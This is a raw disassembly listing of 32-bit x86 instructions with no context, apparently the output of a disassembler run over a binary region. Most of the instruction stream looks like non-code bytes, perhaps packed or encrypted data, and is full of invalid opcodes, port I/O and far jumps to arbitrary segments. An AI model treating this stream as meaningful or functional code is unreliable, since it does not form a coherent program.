  41a9f9:	fsub   DWORD PTR [edx]
  41a9fb:	mov    esi,0x96b43ef9
  41aa00:	jge    0x41aa5a
  41aa02:	xchg   edx,eax
  41aa03:	mov    ebx,0x2e13db43
  41aa08:	ret    0xc89b
  41aa0b:	std    
  41aa0c:	fistp  DWORD PTR ds:0x2e0212ba
  41aa12:	into   
  41aa13:	xchg   edx,eax
  41aa14:	outs   dx,BYTE PTR ds:[esi]
  41aa15:	in     eax,dx
  41aa16:	inc    esi
  41aa17:	jno    0x41aa3c
  41aa19:	jp     0x41a9dd
  41aa1b:	xchg   esi,eax
  41aa1c:	jne    0x41aa0d
  41aa1e:	das    
  41aa1f:	adc    eax,0xc7c1c1d8
  41aa24:	cmp    DWORD PTR [eax],esp
  41aa26:	mov    ?,ebp
  41aa28:	jmp    0x41a9ba
  41aa2a:	and    BYTE PTR [eax-0x5044f8f5],cl
  41aa30:	(bad)  
  41aa31:	sar    BYTE PTR [ecx+edx*4],1
  41aa34:	mov    esi,0x7f85e89a
  41aa39:	jne    0x41aa57
  41aa3b:	arpl   WORD PTR [eax-0x1ce2ebc0],di
  41aa41:	sbb    al,0x95
  41aa43:	add    edi,ebp
  41aa45:	mov    dh,0xcb
  41aa47:	inc    ebp
  41aa48:	jg     0x41aa48
  41aa4a:	inc    ecx
  41aa4b:	fidiv  DWORD PTR [eax+0x559e6b18]
  41aa51:	test   DWORD PTR [edi-0x699da9b3],0xf194d5d6
  41aa5b:	push   esi
  41aa5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa5d:	fisttp DWORD PTR [ebp+0xd4ecb61]
  41aa63:	mov    al,0x7d
  41aa65:	add    al,0xc5
  41aa67:	inc    ebx
  41aa68:	outs   dx,BYTE PTR ds:[esi]
  41aa69:	test   al,0x9a
  41aa6b:	mov    ebp,0xe45cef24
  41aa70:	push   eax
  41aa71:	into   
  41aa72:	inc    esi
  41aa73:	push   ebx
  41aa74:	or     edx,DWORD PTR [eax-0x122d90e8]
  41aa7a:	or     DWORD PTR [edx+eax*4-0x65],0x63921d1c
  41aa82:	push   es
  41aa83:	or     esi,DWORD PTR ds:0x2978e4fb
  41aa89:	fcom   DWORD PTR [edi-0x61f39412]
  41aa8f:	mov    dh,BYTE PTR [ecx+0x0]
  41aa92:	mov    BYTE PTR [edi-0x23],bl
  41aa95:	jg     0x41aa2f
  41aa97:	fimul  DWORD PTR [ebx-0x7e]
  41aa9a:	xchg   DWORD PTR [esi],ebp
  41aa9c:	sub    BYTE PTR [edi-0x6f],ah
  41aa9f:	cli    
  41aaa0:	pusha  
  41aaa1:	mov    esi,0x7893df0
  41aaa6:	cdq    
  41aaa7:	ds pop eax
  41aaa9:	dec    esp
  41aaaa:	jp     0x41aab9
  41aaac:	ins    BYTE PTR es:[edi],dx
  41aaad:	xchg   edx,eax
  41aaae:	stos   DWORD PTR es:[edi],eax
  41aaaf:	adc    DWORD PTR [edi-0x5e],ebx
  41aab2:	pshufw mm7,QWORD PTR ds:0x98a98873,0xe9
  41aaba:	mov    al,0x8a
  41aabc:	cmc    
  41aabd:	neg    BYTE PTR [esi-0x75]
  41aac0:	jo     0x41aa62
  41aac2:	mov    al,ds:0xa59683b1
  41aac7:	and    BYTE PTR ds:0xffeb0f94,bl
  41aacd:	pushf  
  41aace:	popaw  
  41aad0:	xor    BYTE PTR [esi-0x2d],0x8a
  41aad4:	pop    ss
  41aad5:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41aad7:	pop    edx
  41aad8:	dec    eax
  41aad9:	shr    DWORD PTR [esi],1
  41aadb:	push   esp
  41aadc:	dec    ecx
  41aadd:	hlt    
  41aade:	push   ecx
  41aadf:	adc    cl,BYTE PTR [ebx-0x1544e90d]
  41aae5:	sub    ecx,0xeb566cf
  41aaeb:	cdq    
  41aaec:	data16 and ch,bh
  41aaef:	pop    es
  41aaf0:	das    
  41aaf1:	xchg   edx,eax
  41aaf2:	sub    al,0xf5
  41aaf4:	jg     0x41aaed
  41aaf6:	fistp  DWORD PTR [edi+0x4e6d1366]
  41aafc:	dec    edi
  41aafd:	push   edx
  41aafe:	mov    DWORD PTR [edi-0x1c],edx
  41ab01:	out    0xa6,al
  41ab03:	xchg   ebp,eax
  41ab04:	repz jg 0x41ab08
  41ab07:	dec    ecx
  41ab08:	push   0xfffffff0
  41ab0a:	neg    DWORD PTR [edx-0x7f]
  41ab0d:	mov    ebx,0xdf294765
  41ab12:	jmp    DWORD PTR [esi+0x1f]
  41ab15:	push   ds
  41ab16:	cdq    
  41ab17:	add    ebx,esi
  41ab19:	loopne 0x41ab18
  41ab1b:	pop    ecx
  41ab1c:	adc    dh,dh
  41ab1e:	mov    al,ds:0x80dd9b0e
  41ab23:	xchg   ebp,eax
  41ab24:	sbb    eax,0xd7d07deb
  41ab29:	mov    ah,0x6a
  41ab2b:	sub    eax,0x4c494e90
  41ab30:	jo     0x41ab48
  41ab32:	push   0xdd27134c
  41ab37:	and    BYTE PTR [edi],cl
  41ab39:	pop    ecx
  41ab3a:	push   0x5
  41ab3c:	dec    ecx
  41ab3d:	pop    ebx
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0xee8b0dbe
  41ab52:	mov    fs,WORD PTR [eax-0x25]
  41ab55:	jg     0x41abcf
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41ab91
  41ab5c:	ret    0xf0d2
  41ab5f:	inc    esp
  41ab60:	pop    esp
  41ab61:	xor    eax,0x510c1165
  41ab66:	xchg   BYTE PTR [ecx+0x72],dh
  41ab69:	scas   al,BYTE PTR es:[edi]
  41ab6a:	mov    DWORD PTR [edi],edx
  41ab6c:	scas   al,BYTE PTR es:[edi]
  41ab6d:	sub    BYTE PTR [ebx],ch
  41ab6f:	xchg   ebp,eax
  41ab70:	and    BYTE PTR [ebx-0x1f3f4668],0x9f
  41ab77:	jmp    0x89aa:0xd1bfcddc
  41ab7e:	xchg   ebx,eax
  41ab7f:	add    ecx,eax
  41ab81:	push   0x369904f9
  41ab86:	dec    edi
  41ab87:	mov    al,ds:0x584bd8a7
  41ab8c:	and    BYTE PTR [edx-0x6c],al
  41ab8f:	mov    esi,0xaa95d791
  41ab94:	mov    eax,ds:0x6b63dc5f
  41ab99:	mov    edx,0x3580bd95
  41ab9e:	sbb    dh,BYTE PTR [eax-0x1810d3a5]
  41aba4:	test   al,0x19
  41aba6:	xchg   ch,al
  41aba8:	cmp    cl,BYTE PTR [esp+edi*1-0x3631697b]
  41abaf:	jmp    0x41ab52
  41abb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abb2:	shr    dh,0x59
  41abb5:	cmp    DWORD PTR [edi],ebx
  41abb7:	test   esi,0x39977913
  41abbd:	mov    edx,0x7068cc6a
  41abc2:	xor    eax,0x7b79a013
  41abc7:	and    BYTE PTR [esi+0x7d613071],ah
  41abcd:	cmc    
  41abce:	sbb    BYTE PTR [eax-0x3dab873c],bh
  41abd4:	mov    cl,0x40
  41abd6:	and    BYTE PTR [edx-0x54d8e4e1],ch
  41abdc:	in     eax,dx
  41abdd:	fs call 0x2940:0xab1e3f6e
  41abe5:	adc    ebp,DWORD PTR [eax-0x25]
  41abe8:	shl    BYTE PTR [ecx+0x8aa16d0],0x45
  41abef:	jle    0x41ac67
  41abf1:	xor    cl,bl
  41abf3:	sub    cl,BYTE PTR [edi+esi*2]
  41abf6:	in     al,dx
  41abf7:	or     al,BYTE PTR [ecx+0x3b]
  41abfa:	mov    al,0x20
  41abfc:	clc    
  41abfd:	jnp    0x41abcc
  41abff:	ret    0x838d
  41ac02:	add    ecx,DWORD PTR [ecx-0x4771b64b]
  41ac08:	inc    ebp
  41ac09:	and    BYTE PTR [esi-0x2ecacab9],ah
  41ac0f:	fistp  DWORD PTR [ebx-0x7e]
  41ac12:	repnz loopne 0x41abba
  41ac15:	lock cld 
  41ac17:	pop    ss
  41ac18:	ret    
  41ac19:	int3   
  41ac1a:	jge    0x41ac27
  41ac1c:	das    
  41ac1d:	xchg   esp,eax
  41ac1e:	push   esp
  41ac1f:	pop    es
  41ac20:	and    eax,0x9bab0543
  41ac25:	icebp  
  41ac26:	xchg   esp,eax
  41ac27:	sbb    DWORD PTR [esi-0x61],0x6
  41ac2b:	cmp    eax,0xa4d3f031
  41ac30:	scas   eax,DWORD PTR es:[edi]
  41ac31:	xchg   BYTE PTR [ecx+0x624efcef],bh
  41ac37:	(bad)  
  41ac38:	out    dx,eax
  41ac39:	fcmovnbe st,st(2)
  41ac3b:	test   ecx,0xe75dd688
  41ac41:	add    edi,ebx
  41ac43:	fsubr  DWORD PTR [bx]
  41ac46:	rol    DWORD PTR [edx-0x773dea76],0x11
  41ac4d:	mov    ebp,0xe07f22fb
  41ac52:	sahf   
  41ac53:	push   edi
  41ac54:	pop    edx
  41ac55:	adc    bh,al
  41ac57:	push   esp
  41ac58:	or     DWORD PTR [ecx+ebp*1],edi
  41ac5b:	into   
  41ac5c:	push   esi
  41ac5d:	adc    bh,BYTE PTR [ebx-0x45fa3a4f]
  41ac63:	sbb    al,0x98
  41ac65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac66:	das    
  41ac67:	sub    al,0xe0
  41ac69:	or     dl,BYTE PTR [esi-0x606c7a96]
  41ac6f:	push   0xffffffc0
  41ac71:	mov    bl,0x1c
  41ac73:	into   
  41ac74:	jge    0x41ac2e
  41ac76:	and    dh,BYTE PTR [ebx]
  41ac78:	pop    ss
  41ac79:	sub    BYTE PTR [eax+ecx*4+0x79],bl
  41ac7d:	fild   WORD PTR [edx+0x4f]
  41ac80:	ficom  DWORD PTR [ebx+edi*8+0x1e4b1f0a]
  41ac87:	aam    0xc
  41ac89:	mov    ch,0xf7
  41ac8b:	sahf   
  41ac8c:	mov    edx,0x48729ef1
  41ac91:	clc    
  41ac92:	hlt    
  41ac93:	or     DWORD PTR [ecx+0x533b0fdc],ebp
  41ac99:	jecxz  0x41ac70
  41ac9b:	iret   
  41ac9c:	mov    edi,0x2952d929
  41aca1:	sub    eax,0xbb239cdd
  41aca6:	cdq    
  41aca7:	xchg   ecx,eax
  41aca8:	addr16 push edx
  41acaa:	or     ch,BYTE PTR [edx-0xe6eff30]
  41acb0:	repz mov bl,0x15
  41acb3:	add    ah,BYTE PTR [ebp+0x34bd76a0]
  41acb9:	mov    esp,DWORD PTR [di]
  41acbc:	inc    DWORD PTR [edx+0x6d20443a]
  41acc2:	scas   eax,DWORD PTR es:[edi]
  41acc3:	xor    eax,0xea8bb40f
  41acc8:	adc    esp,DWORD PTR [ebx]
  41acca:	add    al,0x5b
  41accc:	and    bh,BYTE PTR [edx-0x48475c6c]
  41acd2:	xor    esp,ebx
  41acd4:	call   0x2769:0x1df35c51
  41acdb:	pop    esi
  41acdc:	out    0xdd,eax
  41acde:	shl    al,1
  41ace0:	mov    BYTE PTR [edx],bl
  41ace2:	push   edi
  41ace3:	jno    0x41ac90
  41ace5:	stos   BYTE PTR es:[edi],al
  41ace6:	and    BYTE PTR [ebp-0x59bf5e4f],0xf1
  41aced:	adc    al,0xe9
  41acef:	sbb    BYTE PTR [eax+edx*8+0x3],cl
  41acf3:	ret    0x6a43
  41acf6:	mov    edi,0x354331c9
  41acfb:	adc    al,0x38
  41acfd:	jae    0x41acb1
  41acff:	xchg   BYTE PTR [edx],bl
  41ad01:	pop    eax
  41ad02:	shl    DWORD PTR [ecx],0x60
  41ad05:	dec    ebx
  41ad06:	fld    TBYTE PTR ds:0xf8248e37
  41ad0c:	(bad)  
  41ad0d:	mov    DWORD PTR [ebp-0x34],ebp
  41ad10:	(bad)  
  41ad11:	(bad)  
  41ad12:	pop    ds
  41ad13:	mov    dh,0x68
  41ad15:	(bad)  
  41ad16:	arpl   ax,ax
  41ad18:	xchg   ecx,eax
  41ad19:	pop    es
  41ad1a:	sub    esi,ebx
  41ad1c:	add    eax,0x394f9929
  41ad21:	xor    DWORD PTR [esi-0x4b5c7248],0x4d598c78
  41ad2b:	pop    edi
  41ad2c:	mov    bl,0xa
  41ad2e:	sub    BYTE PTR [ecx+ebp*4+0x3c],ch
  41ad32:	pop    edx
  41ad33:	mov    esi,0x736cd06a
  41ad38:	(bad)  
  41ad39:	dec    eax
  41ad3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad3b:	test   BYTE PTR [ebx],bh
  41ad3d:	out    dx,eax
  41ad3e:	cmp    BYTE PTR [ecx+0xbe03d6d],ah
  41ad44:	push   ecx
  41ad45:	lods   eax,DWORD PTR ds:[esi]
  41ad46:	dec    ebp
  41ad47:	xlat   BYTE PTR ds:[ebx]
  41ad48:	dec    esi
  41ad49:	mov    cl,0x80
  41ad4b:	push   ecx
  41ad4c:	push   esi
  41ad4d:	mov    eax,0x78764158
  41ad52:	fnstenv [esi+0x3c695a57]
  41ad58:	inc    edx
  41ad59:	jbe    0x41ad60
  41ad5b:	sbb    cl,dl
  41ad5d:	inc    edx
  41ad5e:	push   esi
  41ad5f:	add    esi,DWORD PTR [esi]
  41ad61:	scas   eax,DWORD PTR es:[edi]
  41ad62:	jge    0x41ad02
  41ad64:	mov    ch,0xfe
  41ad66:	mov    esi,0x409913a2
  41ad6b:	fwait
  41ad6c:	jge    0x41acf7
  41ad6e:	test   DWORD PTR [esi+eax*2-0x30],edx
  41ad72:	bound  eax,QWORD PTR [edi-0x1626d435]
  41ad78:	xor    BYTE PTR [edx],al
  41ad7a:	add    BYTE PTR [eax],al
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0xc6d25295,eax
  41ad89:	and    ebx,DWORD PTR [esi+0x7fd8781a]
  41ad8f:	js     0x41ada1
  41ad91:	jle    0x41ae0b
  41ad93:	js     0x41ad9b
  41ad95:	fcom   DWORD PTR [ebp+0x51]
  41ad98:	test   BYTE PTR [edi],bh
  41ad9a:	or     eax,0x43f274de
  41ad9f:	jo     0x41add0
  41ada1:	lock ficom DWORD PTR [eax]
  41ada4:	jbe    0x41adcf
  41ada6:	push   ebx
  41ada7:	inc    esp
  41ada8:	stos   DWORD PTR es:[edi],eax
  41ada9:	or     eax,0x11563832
  41adae:	loop   0x41adda
  41adb0:	loop   0x41adde
  41adb2:	cmp    ebx,DWORD PTR [ebx+edi*8]
  41adb5:	add    edx,DWORD PTR [esi+edx*4-0x3f]
  41adb9:	add    BYTE PTR [ecx],al
  41adbb:	inc    edx
  41adbc:	clc    
  41adbd:	in     al,dx
  41adbe:	mov    ah,0x87
  41adc0:	lahf   
  41adc1:	mov    cl,0x60
  41adc3:	adc    bl,bh
  41adc5:	xchg   ebp,eax
  41adc6:	retf   
  41adc7:	jge    0x41add0
  41adc9:	sub    eax,0x2629d5db
  41adce:	dec    BYTE PTR [eax]
  41add0:	mov    dh,0xb7
  41add2:	and    ch,BYTE PTR [ebp+0x4]
  41add5:	push   eax
  41add6:	(bad)  
  41add8:	xor    al,0x99
  41adda:	add    al,0x82
  41addc:	aaa    
  41addd:	mov    dh,0x42
  41addf:	mov    al,0x4e
  41ade1:	inc    BYTE PTR [ecx+eax*8]
  41ade4:	out    dx,eax
  41ade5:	(bad)  
  41ade7:	ds in  al,dx
  41ade9:	inc    ecx
  41adea:	jbe    0x41ada3
  41adec:	inc    eax
  41aded:	cmp    bh,ah
  41adef:	jns    0x41ae50
  41adf1:	mov    ebp,0x3116cfaa
  41adf6:	inc    edx
  41adf7:	sub    BYTE PTR [ecx],ch
  41adf9:	adc    BYTE PTR [edi],dh
  41adfb:	add    DWORD PTR [ebp-0x1c],esi
  41adfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adff:	and    DWORD PTR [ecx-0x6d],eax
  41ae02:	mov    dh,0x5e
  41ae04:	lods   al,BYTE PTR ds:[esi]
  41ae05:	xchg   ecx,eax
  41ae06:	hlt    
  41ae07:	xor    cl,BYTE PTR [esi]
  41ae09:	xchg   esi,eax
  41ae0a:	inc    edi
  41ae0b:	lea    esi,[eax-0x11157557]
  41ae11:	ds aas 
  41ae13:	dec    edi
  41ae14:	jb     0x41ade5
  41ae16:	in     eax,dx
  41ae17:	push   ebp
  41ae18:	add    eax,DWORD PTR [ebp-0x54668019]
  41ae1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae1f:	cmp    DWORD PTR [edi+0x33d1385f],ecx
  41ae25:	or     dh,al
  41ae27:	test   eax,ecx
  41ae29:	bound  edi,QWORD PTR [edx]
  41ae2b:	ins    DWORD PTR es:[edi],dx
  41ae2c:	mov    edx,0x50668830
  41ae31:	push   0x6b
  41ae33:	push   ds
  41ae34:	in     al,0x50
  41ae36:	mov    al,ds:0x2ff78ff7
  41ae3b:	cmp    eax,0xac9ffae2
  41ae40:	test   DWORD PTR [edx+eax*2+0x67b75f89],eax
  41ae47:	lods   eax,DWORD PTR ds:[esi]
  41ae48:	xor    BYTE PTR [eax-0x45ccfd14],ah
  41ae4e:	cmp    DWORD PTR [ebp+0x652cc6be],esp
  41ae54:	and    al,0x93
  41ae56:	sub    al,0x4e
  41ae58:	mov    ds:0x6c00d7b2,eax
  41ae5d:	jl     0x41adea
  41ae5f:	scas   al,BYTE PTR es:[edi]
  41ae60:	inc    esp
  41ae61:	ud0    edx,edx
  41ae64:	ds xchg ebp,eax
  41ae66:	popf   
  41ae67:	or     al,bl
  41ae69:	xor    al,0xc4
  41ae6b:	mov    edi,0x3c3457b0
  41ae70:	rcl    BYTE PTR [eax],cl
  41ae72:	arpl   WORD PTR [eax+0x77],bx
  41ae75:	jno    0x41ae27
  41ae77:	add    al,BYTE PTR [eax-0x70]
  41ae7a:	jae    0x41ae21
  41ae7c:	pushf  
  41ae7d:	sub    BYTE PTR [edi+0x7c],ch
  41ae80:	fild   QWORD PTR [esi-0x1f373e18]
  41ae86:	pusha  
  41ae87:	or     BYTE PTR [edx-0x35],bh
  41ae8a:	mov    ds:0x88972e4a,eax
  41ae8f:	dec    ebx
  41ae90:	xor    esp,DWORD PTR [eax-0x695fc027]
  41ae96:	pop    esp
  41ae97:	adc    DWORD PTR [eax-0x3],esi
  41ae9a:	retf   
  41ae9b:	mov    edi,DWORD PTR fs:0x3ec66735
  41aea2:	sbb    al,0xb1
  41aea4:	adc    ecx,DWORD PTR ds:[ecx+0x1deea7b3]
  41aeab:	dec    esi
  41aeac:	(bad)  [esi+0x60]
  41aeaf:	jle    0x41ae8d
  41aeb1:	sub    ebx,DWORD PTR [edx]
  41aeb3:	push   cs
  41aeb4:	sub    eax,0xc3757309
  41aeb9:	and    al,0xa0
  41aebb:	or     eax,0xa07e5d60
  41aec0:	sub    edx,DWORD PTR [eax]
  41aec2:	add    DWORD PTR [edx-0x7c],edi
  41aec5:	xchg   edi,eax
  41aec6:	out    0x9f,al
  41aec8:	cld    
  41aec9:	mov    al,0xaf
  41aecb:	dec    esp
  41aecc:	(bad)  
  41aece:	iret   
  41aecf:	icebp  
  41aed0:	jge    0x41ae74
  41aed2:	sub    eax,0xad567f58
  41aed7:	sbb    BYTE PTR [ecx-0x28],cl
  41aeda:	(bad)  [edi+0x1c]
  41aedd:	rcr    BYTE PTR [edx-0x7c],cl
  41aee0:	xlat   BYTE PTR ds:[ebx]
  41aee1:	cdq    
  41aee2:	or     DWORD PTR [ecx-0x13],eax
  41aee5:	in     eax,0xa0
  41aee7:	or     eax,0xa3d25f74
  41aeec:	mov    al,ds:0xe59b9b23
  41aef1:	mov    bh,0x30
  41aef3:	inc    edx
  41aef4:	clc    
  41aef5:	je     0x41af3a
  41aef7:	sahf   
  41aef8:	int    0xbe
  41aefa:	fldenv [ebp-0x79]
  41aefd:	sbb    DWORD PTR [eax-0x17],0xffffffba
  41af01:	xchg   ecx,eax
  41af02:	scas   eax,DWORD PTR es:[edi]
  41af03:	sbb    BYTE PTR [ebx-0x134a25b4],0xa2
  41af0a:	sti    
  41af0b:	fnsave [ebx+0x4d]
  41af0e:	jmp    0xba06:0xc8a602b
  41af15:	sbb    al,BYTE PTR [edx+0x7ba0bdce]
  41af1b:	xor    al,BYTE PTR [edx+0x23]
  41af1e:	jne    0x41af1c
  41af20:	pop    ecx
  41af21:	pop    esi
  41af22:	mov    bh,0xd4
  41af24:	push   es
  41af25:	push   esp
  41af26:	push   es
  41af27:	ficomp DWORD PTR [edx+ecx*8+0x70b94fbb]
  41af2e:	sbb    ecx,DWORD PTR [esi+eiz*4-0x62]
  41af32:	cmp    al,0x6f
  41af34:	bound  esi,QWORD PTR [ebx-0x3b]
  41af37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af38:	jno    0x41af02
  41af3a:	shl    BYTE PTR [ecx+ebp*8-0x1f],0x3d
  41af3f:	xor    dl,0x3e
  41af42:	test   DWORD PTR gs:[ecx+0x28],0xeac65427
  41af4a:	scas   al,BYTE PTR es:[edi]
  41af4b:	mov    esp,0x419f43e8
  41af50:	leave  
  41af51:	sub    esp,DWORD PTR [ebx+0x2e]
  41af54:	mov    ds:0x7e0ec1e5,al
  41af59:	dec    esp
  41af5a:	push   esp
  41af5b:	mov    ah,0xff
  41af5d:	clc    
  41af5e:	retf   0xfb95
  41af61:	jo     0x41afc7
  41af63:	jbe    0x41af17
  41af65:	je     0x41afb5
  41af67:	pop    eax
  41af68:	push   es
  41af69:	cli    
  41af6a:	sub    BYTE PTR [edx+eiz*2],dh
  41af6d:	mov    ah,BYTE PTR [eax+0x4a]
  41af70:	inc    ebx
  41af71:	mov    eax,0xb514e634
  41af76:	daa    
  41af77:	pop    ds
  41af78:	loopne 0x41af03
  41af7a:	and    edx,ecx
  41af7c:	sub    BYTE PTR ds:0x1f5ebf8f,0x21
  41af83:	mov    esp,0x92891f37
  41af88:	sub    DWORD PTR ds:0x5f1ff9ed,esi
  41af8e:	shl    DWORD PTR [esi-0x3a],cl
  41af91:	xor    al,0x3
  41af93:	push   cs
  41af94:	sub    bl,BYTE PTR [edi]
  41af96:	inc    ebx
  41af97:	jl     0x41af5c
  41af99:	(bad)  
  41af9a:	jg     0x41af4e
  41af9c:	mov    dh,0x5a
  41af9e:	fcomp  st(0)
  41afa0:	dec    edx
  41afa1:	or     BYTE PTR [edi+0x4d6550b0],dl
  41afa7:	mov    ebp,0x51a87048
  41afac:	xchg   ebx,ecx
  41afae:	jmp    0x41b1e3
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi+0x66181003]
  41afc0:	fcomp  st(7)
  41afc2:	mov    eax,0x787fde10
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41af73
  41afcc:	adc    DWORD PTR [eax],esi
  41afce:	jno    0x41af8f
  41afd0:	repz sub al,0x5e
  41afd3:	gs jno 0x41b016
  41afd6:	jnp    0x41b055
  41afd8:	jg     0x41aff1
  41afda:	loope  0x41afad
  41afdc:	adc    bh,ah
  41afde:	call   0xae2c4cb9
  41afe3:	add    DWORD PTR [edi+edx*1-0x8793414],0x10
  41afeb:	adc    BYTE PTR [esp+edi*8-0x6b268bc7],bl
  41aff2:	test   eax,0xc01d7225
  41aff7:	in     al,dx
  41aff8:	sbb    esi,DWORD PTR [ebp-0x20254ec6]
  41affe:	test   al,0x93
  41b000:	nop
  41b001:	and    al,0xd4
  41b003:	test   DWORD PTR [ebx+0x145196f5],ecx
  41b009:	cmp    al,0x97
  41b00b:	(bad)  
  41b00c:	cmp    ch,BYTE PTR [ecx]
  41b00e:	xor    BYTE PTR [eax+ebx*1-0x52f7e8d6],dl
  41b015:	nop
  41b016:	push   esp
  41b017:	dec    eax
  41b018:	add    ch,BYTE PTR [esi]
  41b01a:	cmc    
  41b01b:	mov    fs,WORD PTR [ecx+0x2d]
  41b01e:	stc    
  41b01f:	xor    al,0x5b
  41b021:	outs   dx,DWORD PTR ds:[esi]
  41b022:	in     al,0x12
  41b024:	sbb    al,0x22
  41b026:	loop   0x41b009
  41b028:	sbb    BYTE PTR [esi+0x276744e4],0xf2
  41b02f:	lods   eax,DWORD PTR ds:[esi]
  41b030:	add    DWORD PTR [ecx],esp
  41b032:	pop    es
  41b033:	dec    edi
  41b034:	rol    BYTE PTR [ebp-0x26229f55],0x43
  41b03b:	mov    ah,0x14
  41b03d:	push   0x1b
  41b03f:	xor    al,BYTE PTR [ebp-0x48]
  41b042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b043:	in     al,dx
  41b044:	sti    
  41b045:	(bad)  
  41b046:	in     al,0x7d
  41b048:	mov    eax,0x3864ea3c
  41b04d:	aaa    
  41b04e:	out    dx,eax
  41b04f:	lods   eax,DWORD PTR ds:[esi]
  41b050:	fsub   QWORD PTR [edi-0x7bc4136c]
  41b056:	mov    ebp,0x502e6f49
  41b05b:	cmp    BYTE PTR ds:0x526b7738,al
  41b061:	sbb    edx,ebp
  41b063:	dec    ecx
  41b064:	or     al,0xf4
  41b066:	stos   BYTE PTR es:[edi],al
  41b067:	xchg   esp,eax
  41b068:	add    bh,ah
  41b06a:	or     ah,ah
  41b06c:	ret    0x22b8
  41b06f:	xchg   esi,eax
  41b070:	jns    0x41b0a1
  41b072:	mov    ebx,0x6179f4d6
  41b077:	inc    edx
  41b079:	jle    0x41b033
  41b07b:	aas    
  41b07c:	sahf   
  41b07d:	daa    
  41b07e:	dec    edi
  41b07f:	mov    ecx,0x555b5ddd
  41b084:	aad    0x4c
  41b086:	stos   BYTE PTR es:[edi],al
  41b087:	lahf   
  41b088:	rcr    cl,0xa0
  41b08b:	hlt    
  41b08c:	mov    esi,0x123b0030
  41b091:	pushf  
  41b092:	xor    dh,ah
  41b094:	lds    esp,FWORD PTR [ebx-0x5a06118]
  41b09a:	cmp    BYTE PTR [ebx],0x99
  41b09d:	xlat   BYTE PTR ds:[ebx]
  41b09e:	push   ds
  41b09f:	cdq    
  41b0a0:	scas   eax,DWORD PTR es:[edi]
  41b0a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0a2:	pop    ss
  41b0a3:	scas   eax,DWORD PTR es:[edi]
  41b0a4:	(bad)  
  41b0a5:	xchg   ebp,eax
  41b0a6:	popa   
  41b0a7:	idiv   BYTE PTR [edi+eiz*4+0x23]
  41b0ab:	pop    edx
  41b0ac:	leave  
  41b0ad:	jo     0x41b08d
  41b0af:	cwde   
  41b0b0:	mov    es,WORD PTR [esi+0xb]
  41b0b3:	and    edi,ebx
  41b0b5:	push   esi
  41b0b6:	sub    cl,bh
  41b0b8:	mov    ebp,0xedc4917
  41b0bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0be:	mov    ds:0xb785e87c,eax
  41b0c3:	inc    edi
  41b0c4:	push   0x9be11b8d
  41b0c9:	mov    ch,0x4b
  41b0cb:	dec    edi
  41b0cc:	xchg   esi,eax
  41b0cd:	sbb    al,0xc8
  41b0cf:	jle    0x41b0c1
  41b0d1:	call   0x35ff:0xcd8a6ff0
  41b0d8:	aaa    
  41b0d9:	vmwrite esp,DWORD PTR [ecx+ebp*1]
  41b0dd:	dec    ecx
  41b0de:	sub    DWORD PTR [edi-0x55],0xffffffdd
  41b0e2:	rcl    DWORD PTR ds:0xf0bfdbc6,cl
  41b0e8:	cs (bad) 
  41b0ea:	loopne 0x41b13e
  41b0ec:	cmp    esp,DWORD PTR [ebx+0x417fd724]
  41b0f2:	(bad)  
  41b0f3:	div    DWORD PTR [ecx+0x6f]
  41b0f6:	pop    edx
  41b0f7:	mov    bl,0xdd
  41b0f9:	in     al,dx
  41b0fa:	cmp    bh,BYTE PTR [edi+0x390951ff]
  41b100:	jmp    0x6ba0:0xb8182edf
  41b107:	rcr    BYTE PTR [edi],cl
  41b109:	jnp    0x41b0b5
  41b10b:	mov    eax,0xf9860962
  41b110:	fild   WORD PTR [ecx-0x2b08c233]
  41b116:	(bad)  
  41b117:	jp     0x41b194
  41b119:	jae    0x41b111
  41b11b:	fimul  DWORD PTR [ebx+eiz*8-0x55f5320d]
  41b122:	pusha  
  41b123:	xchg   edx,eax
  41b124:	mov    esi,0x4afa29e
  41b129:	outs   dx,DWORD PTR ds:[esi]
  41b12a:	test   al,0x53
  41b12c:	jg     0x41b0d4
  41b12e:	push   esi
  41b130:	pop    ecx
  41b131:	iret   
  41b132:	outs   dx,BYTE PTR ds:[esi]
  41b133:	iret   
  41b134:	repz add BYTE PTR [ebx-0x8cfcd6c],bh
  41b13b:	outs   dx,DWORD PTR ds:[esi]
  41b13c:	xchg   esi,eax
  41b13d:	jno    0x41b10c
  41b13f:	pop    ds
  41b140:	es push ds
  41b142:	mov    al,0xc7
  41b144:	dec    esi
  41b145:	sti    
  41b146:	fs stc 
  41b148:	imul   edi,DWORD PTR ds:0x309998e0,0x5a603c61
  41b152:	lods   al,BYTE PTR ds:[esi]
  41b153:	mov    al,0x63
  41b155:	xchg   edi,eax
  41b156:	push   ecx
  41b157:	loopne 0x41b12f
  41b159:	shrd   esp,edx,0x5a
  41b15d:	stos   DWORD PTR es:[edi],eax
  41b15e:	cmp    bh,BYTE PTR [edi+ecx*4]
  41b161:	fmulp  st(7),st
  41b163:	addr16 test al,0x44
  41b166:	daa    
  41b167:	stc    
  41b168:	cld    
  41b169:	imul   edi,DWORD PTR [ebx+0x5ba5f1d8],0xffffffed
  41b170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b171:	ins    DWORD PTR es:[edi],dx
  41b172:	push   ebx
  41b173:	mov    edx,0x366f40d7
  41b178:	mov    ch,0xa2
  41b17a:	xchg   esi,eax
